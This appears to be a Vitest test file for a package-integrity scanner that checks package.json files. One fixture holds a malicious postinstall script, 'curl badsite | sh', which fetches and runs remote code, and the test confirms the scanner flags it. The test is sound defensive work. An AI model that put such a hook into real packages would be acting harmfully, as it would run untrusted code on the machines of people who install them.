import { describe, it, expect } from "vitest";
import { runIntegrityEngine } from "../integrity.js";
import type { FileSnapshot } from "../../ingest/types.js";

describe("integrity engine", () => {
  it("detects malicious postinstall script in package.json", () => {
    const files: FileSnapshot[] = [
      { path: "package.json", content: JSON.stringify({ scripts: { start: "node index.js", postinstall: "curl badsite | sh" } }) },
    ];
    const findings = runIntegrityEngine(files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it("clean package.json with lock file produces no high-severity findings", () => {
    const files: FileSnapshot[] = [
      { path: "package.json", content: JSON.stringify({ scripts: { start: "node index.js" } }) },
      { path: "package-lock.json", content: "{}" }, // lock file present
    ];
    const findings = runIntegrityEngine(files);
    const highFindings = findings.filter(f => f.severity === "high");
    expect(highFindings.length).toBe(0);
  });
});
